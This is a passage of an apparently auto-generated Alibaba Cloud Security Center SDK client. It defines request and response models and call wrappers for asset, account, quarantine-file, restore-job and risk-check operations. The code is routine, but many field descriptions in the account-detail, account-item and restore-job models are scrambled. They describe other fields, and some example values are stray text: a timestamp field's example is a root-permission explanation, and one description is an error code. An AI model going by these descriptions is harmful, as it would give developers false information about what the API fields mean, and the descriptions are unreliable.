  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='en'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribePropertyTypeScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  propertyTypeItems?: [ 
    {
      name?: string(name='Name', example='Docker Component'),
      type?: string(name='Type', example='docker_component'),
    }
  ](name='PropertyTypeItems'),
  requestId?: string(name='RequestId', example='B7A839E8-70AE-591D-8D9E-C5419A22****'),
}

model DescribePropertyTypeScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyTypeScaItemResponseBody(name='body'),
}

async function describePropertyTypeScaItemWithOptions(request: DescribePropertyTypeScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyTypeScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyTypeScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyTypeScaItem(request: DescribePropertyTypeScaItemRequest): DescribePropertyTypeScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyTypeScaItemWithOptions(request, runtime);
}

model DescribePropertyUsageNewestRequest {
  type?: string(name='Type', example='user'),
}

model DescribePropertyUsageNewestResponseBody = {
  itemCount?: int32(name='ItemCount', example='5'),
  newestStatisticItems?: [ 
    {
      create?: long(name='Create', example='1566178646000'),
      name?: string(name='Name', example='root'),
    }
  ](name='NewestStatisticItems'),
  requestId?: string(name='RequestId'),
  type?: string(name='Type', example='user'),
}

model DescribePropertyUsageNewestResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUsageNewestResponseBody(name='body'),
}

async function describePropertyUsageNewestWithOptions(request: DescribePropertyUsageNewestRequest, runtime: Util.RuntimeOptions): DescribePropertyUsageNewestResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUsageNewest',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUsageNewest(request: DescribePropertyUsageNewestRequest): DescribePropertyUsageNewestResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUsageNewestWithOptions(request, runtime);
}

model DescribePropertyUserDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page. Default value: **10**.', example='1'),
  extend?: string(name='Extend', description='The details of asset fingerprints for the account.', example='1'),
  isRoot?: string(name='IsRoot', description='The details of the user groups to which the account belongs.', example='0'),
  lastLoginTimeEnd?: long(name='LastLoginTimeEnd', description='The details of the user groups to which the account belongs.', example='Indicates whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes'),
  lastLoginTimeStart?: long(name='LastLoginTimeStart', description='The date on which the account expires.', example='164922523600'),
  pageSize?: int32(name='PageSize', description='The name or IP address of the server.', example='10'),
  remark?: string(name='Remark', description='Indicates whether the password expires. Valid values:

*   **0**: yes
*   **1**: no', example='192.168.XX.XX'),
  user?: string(name='User', description='The number of the page to return. Default value: **1**.', example='bin'),
  uuid?: string(name='Uuid', description='The public IP address of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyUserDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='Specifies whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
    currentPage?: int32(name='CurrentPage', description='The timestamp of the last logoff from the account. Unit: milliseconds.', example='1'),
    pageSize?: int32(name='PageSize', description='The name of the account to which the server belongs.', example='10'),
    totalCount?: int32(name='TotalCount', description='The name of the account.', example='1'),
  }(name='PageInfo', description='Indicates whether the password is locked. Valid values:

*   **0**: yes
*   **1**: no'),
  propertys?: [ 
    {
      accountsExpirationDate?: string(name='AccountsExpirationDate', description='Indicates whether the account is an interactive logon account. Valid values:

*   **0**: no
*   **1**: yes', example='never'),
      createTimestamp?: long(name='CreateTimestamp', description='The last logon time of the account.', example='1649149566000'),
      groupNames?: [ string ](name='GroupNames', description='Queries the asset fingerprints for an account to which a server belongs.'),
      instanceId?: string(name='InstanceId', description='The UUID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The ID of the request, which is used to locate and troubleshoot issues.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The ID of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The number of entries returned per page. Default value: **10**.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='192.168.XX.XX'),
      isCouldLogin?: int32(name='IsCouldLogin', example='0'),
      isPasswdExpired?: int32(name='IsPasswdExpired', example='1'),
      isPasswdLocked?: int32(name='IsPasswdLocked', example='1'),
      isRoot?: string(name='IsRoot', description='The IP addresses of the server.', example='0'),
      isSudoer?: int32(name='IsSudoer', example='0'),
      isUserExpired?: int32(name='IsUserExpired', example='1'),
      lastLoginIp?: string(name='LastLoginIp', description='The pagination information.', example='192.168.XX.XX'),
      lastLoginTime?: string(name='LastLoginTime', description='Specifies whether the fuzzy search by account name is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='2022-04-04 18:07:06'),
      lastLoginTimeDt?: long(name='LastLoginTimeDt', example='1649066826000'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The source IP address of the last logon to the account.', example='1649066826000'),
      passwordExpirationDate?: string(name='PasswordExpirationDate', description='Indicates whether the account expires. Valid values:

*   **0**: yes
*   **1**: no', example='never'),
      status?: string(name='Status', description='This parameter is deprecated. You can ignore it.', example='**'),
      user?: string(name='User', description='The name of the server.', example='bin'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The timestamp of the last logon to the account. Unit: milliseconds.'),
  requestId?: string(name='RequestId', description='The date on which the password of the account expires.', example='33A71BE3-2CC2-14CB-B460-33A1DD82953A'),
}

model DescribePropertyUserDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserDetailResponseBody(name='body'),
}

async function describePropertyUserDetailWithOptions(request: DescribePropertyUserDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyUserDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.isRoot)) {
    query['IsRoot'] = request.isRoot;
  }
  if (!Util.isUnset(request.lastLoginTimeEnd)) {
    query['LastLoginTimeEnd'] = request.lastLoginTimeEnd;
  }
  if (!Util.isUnset(request.lastLoginTimeStart)) {
    query['LastLoginTimeStart'] = request.lastLoginTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserDetail(request: DescribePropertyUserDetailRequest): DescribePropertyUserDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserDetailWithOptions(request, runtime);
}

model DescribePropertyUserItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='The information about the account.', example='true'),
  pageSize?: int32(name='PageSize', description='The ID of the request.', example='2'),
  user?: string(name='User', description='The number of the page to return.', example='adm'),
}

model DescribePropertyUserItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='An array that consists of the account information returned.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page.', example='1'),
    pageSize?: int32(name='PageSize', description='The total number of entries returned.', example='2'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='114'),
  }(name='PageInfo', description='The page number of the returned page.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='Queries information about an account.', example='384'),
      user?: string(name='User', description='The number of servers that belong to the account.', example='adm'),
    }
  ](name='PropertyItems', description='The name of the account.'),
  requestId?: string(name='RequestId', description='The pagination information.', example='76068BE2-F9C4-4EDD-967B-F503B8CCDD3D'),
}

model DescribePropertyUserItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserItemResponseBody(name='body'),
}

async function describePropertyUserItemWithOptions(request: DescribePropertyUserItemRequest, runtime: Util.RuntimeOptions): DescribePropertyUserItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserItem(request: DescribePropertyUserItemRequest): DescribePropertyUserItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserItemWithOptions(request, runtime);
}

model DescribeQuaraFileDownloadInfoRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.

> If you do not specify this parameter, you cannot call the RollbackSuspEventQuaraFile operation to restore a quarantined file. You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', example='123'),
}

model DescribeQuaraFileDownloadInfoResponseBody = {
  downloadUrl?: string(name='DownloadUrl', description='The URL that is used to download the file. The URL is valid for five minutes.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='bb62ef1311bc564377a0378d3axxxxxx'),
  path?: string(name='Path', description='The file path.', example='/etc/test'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.', example='123'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='29874225-EAAC-5415-8501-32DD20FXXXXX'),
  tag?: string(name='Tag', description='The tag that is added to the related alert.', example='6d4ff40a22b15c86adecf2aa48xxxxx'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model DescribeQuaraFileDownloadInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeQuaraFileDownloadInfoResponseBody(name='body'),
}

async function describeQuaraFileDownloadInfoWithOptions(request: DescribeQuaraFileDownloadInfoRequest, runtime: Util.RuntimeOptions): DescribeQuaraFileDownloadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeQuaraFileDownloadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeQuaraFileDownloadInfo(request: DescribeQuaraFileDownloadInfoRequest): DescribeQuaraFileDownloadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeQuaraFileDownloadInfoWithOptions(request, runtime);
}

model DescribeRestoreJobsRequest {
  currentPage?: int32(name='CurrentPage', description='The timestamp when the in-progress restoration task is expected to be complete. Unit: seconds.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The return value of the restoration task.', example='1.1.XX.XX'),
  pageSize?: int32(name='PageSize', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='10'),
  status?: string(name='Status', description='The type of the file that is restored. Valid values:

*   **ECS_FILE**: files on Elastic Compute Service (ECS) instances
*   **FILE**: files on servers in data centers', example='RUNNING'),
}

model DescribeRestoreJobsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The hash value of the snapshot that stores backup data when the data is backed up.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The error message returned.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The number of the page to return. Default value: **1**.', example='69'),
  }(name='PageInfo', description='The folder to which the backup data is restored. After you create the restoration task, the backup data is restored to the specified folder.'),
  requestId?: string(name='RequestId', description='The directory excluded from the anti-ransomware policy. The value is the directory that you specify to skip protection when you create the anti-ransomware policy.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
  restoreJobs?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The URL to download the CSV file. The CSV file contains the files that fail to be restored.', example='20'),
      bytesDone?: long(name='BytesDone', example='20'),
      bytesTotal?: long(name='BytesTotal', description='The size of backup data. Unit: bytes.', example='20'),
      clientId?: string(name='ClientId', description='The time when the restoration task is updated.', example='c-000frxwusjauhp9ajpu6'),
      completeTime?: long(name='CompleteTime', description='The ID of the backup vault in which the backup data is stored.', example='1583289054000'),
      createdTime?: long(name='CreatedTime', description='RUNNING', example='1583289052000'),
      duration?: long(name='Duration', description='DescribeRestoreJobs', example='100'),
      errorCount?: long(name='ErrorCount', description='WB01014029', example='0'),
      errorFile?: string(name='ErrorFile', description='The included directory based on which the files to restore are located. The value is the directory that you specify for protection when you create the anti-ransomware policy', example='s-000f4wxm8f7gur6g2otm.csv'),
      errorFileUrl?: string(name='ErrorFileUrl', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task is created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='["/home/user"]'),
      errorType?: string(name='ErrorType', description='1', example='NONE'),
      eta?: long(name='Eta', description='Queries the details about restoration tasks.', example='1583299054'),
      excludes?: string(name='Excludes', description='The public IP address of the server whose data you want to restore.', example='["/home/user"]'),
      exitCode?: string(name='ExitCode', description='The total number of restoration tasks returned.', example='0'),
      gmtCreate?: string(name='GmtCreate', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2021-04-25T19:11Z'),
      gmtModified?: string(name='GmtModified', description='The ID of the anti-ransomware agent that is used to back up data.', example='2021-04-25T19:11Z'),
      includes?: string(name='Includes', description='The total size of data that you want to restore. Unit: bytes.', example='["/root/disk-uuid-test","/root/install.sh"]'),
      instanceId?: string(name='InstanceId', description='The speed of data restoration. Unit: byte/s.', example='i-bp12xnvdax6307gw****'),
      instanceName?: string(name='InstanceName', description='The error code that is returned for the restoration task.', example='win2012-01'),
      internetIp?: string(name='InternetIp', description='10', example='1.1.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The timestamp when the restoration task is complete. Unit: milliseconds.', example='2.1.XX.XX'),
      itemsDone?: long(name='ItemsDone', description='The number of files that are backed up.', example='0'),
      itemsTotal?: long(name='ItemsTotal', example='0'),
      message?: string(name='Message', description='The total number of files that you want to restore.', example='successful'),
      percentage?: int32(name='Percentage', description='The ID of the anti-ransomware agent that is used to restore data.', example='100'),
      requestId?: string(name='RequestId', description='The internal IP address of the server whose data you want to restore.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
      restoreId?: string(name='RestoreId', description='The version of the backup data.', example='r-000gmcypy5dyf9ey3uv7'),
      restoreName?: string(name='RestoreName', description='The UUID of the server whose data you want to restore.', example='Restore'),
      restoreType?: string(name='RestoreType', description='The total size of data that is restored. Unit: bytes.', example='ECS_FILE'),
      snapshotHash?: string(name='SnapshotHash', description='The number of restoration tasks returned on the current page.', example='a3992de83f529b844135fe795d949181735a7d20e0ac8539485c61b7983e618f'),
      snapshotId?: string(name='SnapshotId', description='The ID of the server whose data you want to restore.', example='s-000gmcypy5dy54e39yny'),
      snapshotVersion?: string(name='SnapshotVersion', description='The time when the restoration task is created.', example='2020-03-03 18:00'),
      source?: string(name='Source', description='The hash value ID of the snapshot that stores backup data when the data is backed up.', example='["/home/admin","\\\\\\\\servername\\\\sharename"]'),
      sourceClientId?: string(name='SourceClientId', description='An array that consists of the restoration tasks.', example='c-000gmcypy5dyf9ey3uv7'),
      speed?: long(name='Speed', description='The pagination information.', example='25766558'),
      status?: string(name='Status', description='The path to the source file that you want to restore.', example='COMPLETE'),
      target?: string(name='Target', description='The ID of the request, which is used to locate and troubleshoot issues.', example='/home'),
      updatedTime?: long(name='UpdatedTime', description='The number of entries returned per page. Default value: **10**.', example='1583289054000'),
      uuid?: string(name='Uuid', description='The name of the restoration task.', example='6E3DABB6-3F6A-40DB-9492-2C8B59C****'),
      vaultId?: string(name='VaultId', description='The ID of the restoration task.', example='v-000b0v0jqzmse2yz06zw'),
    }
  ](name='RestoreJobs', description='The timestamp when the restoration task is created. Unit: milliseconds.'),
}

model DescribeRestoreJobsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestoreJobsResponseBody(name='body'),
}

/**
  * The name of the CSV file. The CSV file contains the files that fail to be restored.
  *
  * @param request DescribeRestoreJobsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobsWithOptions(request: DescribeRestoreJobsRequest, runtime: Util.RuntimeOptions): DescribeRestoreJobsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestoreJobs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The name of the CSV file. The CSV file contains the files that fail to be restored.
  *
  * @param request DescribeRestoreJobsRequest
  * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobs(request: DescribeRestoreJobsRequest): DescribeRestoreJobsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestoreJobsWithOptions(request, runtime);
}

model DescribeRestorePlansRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  instanceName?: string(name='InstanceName', example='sql-test-001'),
  pageSize?: int32(name='PageSize', example='20'),
  status?: string(name='Status', example='running'),
}

model DescribeRestorePlansResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='33'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  restorePlans?: [ 
    {
      createdTime?: long(name='CreatedTime', example='1655174753****'),
      databaseName?: string(name='DatabaseName', example='Bankup****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      policyId?: long(name='PolicyId', example='123'),
      policyName?: string(name='PolicyName', example='KtDataBase'),
      restorePoint?: long(name='RestorePoint', example='165875100****'),
      status?: string(name='Status', example='running'),
      targetDatabaseName?: string(name='TargetDatabaseName', example='OABak'),
      targetInstanceId?: string(name='TargetInstanceId', example='i-2zehqflgbl9ep2he****'),
      targetInstanceName?: string(name='TargetInstanceName', example='hbr-detection-hh'),
      updatedTime?: long(name='UpdatedTime', example='166849080****'),
    }
  ](name='RestorePlans'),
}

model DescribeRestorePlansResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestorePlansResponseBody(name='body'),
}

async function describeRestorePlansWithOptions(request: DescribeRestorePlansRequest, runtime: Util.RuntimeOptions): DescribeRestorePlansResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestorePlans',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRestorePlans(request: DescribeRestorePlansRequest): DescribeRestorePlansResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestorePlansWithOptions(request, runtime);
}

model DescribeRiskCheckItemResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  itemId?: long(name='ItemId', description='The ID of the check item.

> For more information about the IDs and details of the check items that can be used in configuration assessment, see [DescribeRiskCheckResult](~~DescribeRiskCheckResult~~).', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='173.128.XX.XX'),
}

model DescribeRiskCheckItemResultResponseBody = {
  pageContentResource?: {
    contentResource?: map[string]any(name='ContentResource', description='The data of the affected assets on each page in a dynamic table.'),
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='3'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageContentResource', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskCheckItemResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckItemResultResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckInstanceResult operation.
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResultWithOptions(request: DescribeRiskCheckItemResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckItemResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckItemResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckInstanceResult operation.
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResult(request: DescribeRiskCheckItemResultRequest): DescribeRiskCheckItemResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckItemResultWithOptions(request, runtime);
}

model DescribeRiskCheckResultRequest {
  assetType?: string(name='AssetType', description='The cloud service whose configuration check results you want to query. For more information about the check items for the cloud service, see the check item table in the "Response parameters" section of this topic.', example='RDS'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The type of the check item that you want to query. Valid values:

*   **1**: identity authentication and permissions
*   **2**: network access control
*   **3**: log audit
*   **4**: data security
*   **5**: monitoring and alerting
*   **6**: basic security protection

> If you do not specify this parameter, all types of check items are queried.', example='1'),
  itemIds?: [ string ](name='ItemIds', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='ALB_NetWorkAccessControl'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  queryFlag?: string(name='QueryFlag', description='Specifies whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='enabled'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the check item that you want to query. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
}

model DescribeRiskCheckResultResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      affectedCount?: int32(name='AffectedCount', description='The number of affected assets.', example='0'),
      checkTime?: long(name='CheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1639429164000'),
      itemId?: long(name='ItemId', description='The ID of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='1'),
      remainingTime?: int32(name='RemainingTime', description='The time when the next check will be performed.', example='0'),
      repairStatus?: string(name='RepairStatus', description='Indicates whether the risks that are detected based on the check item can be fixed. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='disabled'),
      riskAssertType?: string(name='RiskAssertType', description='The type of the affected assets.', example='ECS'),
      riskItemResources?: [ 
        {
          contentResource?: map[string]any(name='ContentResource', description='The details about the check results.'),
          resourceName?: string(name='ResourceName', description='The title in the details. Valid values:

*   **bestPractice**: description
*   **influence**: risk
*   **suggestion**: solution
*   **helpResource**: reference', example='bestPractice'),
        }
      ](name='RiskItemResources', description='An array that consists of the details about the check item.'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sort?: int32(name='Sort', description='The sequence number in the check results. The check items are sorted based on the sequence number.', example='1'),
      startStatus?: string(name='StartStatus', description='Indicates whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disable**: no', example='enabled'),
      status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
      taskId?: long(name='TaskId', description='The ID of the check task.', example='15384933'),
